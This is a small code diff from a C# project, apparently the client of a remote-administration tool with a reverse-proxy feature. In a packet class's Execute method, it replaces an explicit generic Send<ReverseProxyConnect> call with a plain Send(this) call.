@@ -28,7 +28,7 @@ namespace xClient.Core.ReverseProxy.Packets
 
         public void Execute(Client client)
         {
-            client.Send<ReverseProxyConnect>(this);
+            client.Send(this);
         }
     }
 }
